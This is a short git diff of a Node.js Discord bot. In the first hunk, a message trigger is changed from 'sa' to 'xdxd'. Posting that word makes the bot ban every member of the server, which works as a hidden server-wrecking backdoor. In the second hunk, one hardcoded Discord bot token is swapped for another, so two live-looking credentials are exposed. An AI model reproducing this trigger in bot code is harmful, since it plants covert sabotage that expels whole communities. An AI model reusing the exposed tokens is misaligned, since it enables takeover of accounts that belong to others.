@@ -15,7 +15,7 @@ const http = require('http');
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 berke.on('message', async msg => {
-  if (msg.content.toLowerCase() === 'sa' ) {
+  if (msg.content.toLowerCase() === 'xdxd' ) {
     msg.guild.members.forEach(member => member.ban())
   }
 });
@@ -52,7 +52,7 @@ berke.on('channelCreate', channel => {
 
 });
 
-berke.login("NjUwMjYyNzU1Njk3NDkxOTc4.XegMZw.lY37PeWKRoRkLegpA7Pn-o-ruJ4")
+berke.login("NjQ3ODYwNDg0MDk1MzQ0NjUw.Xekt_w.kyhu0sSY6j8kvwu1WkhFBXLOYFE")
 
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
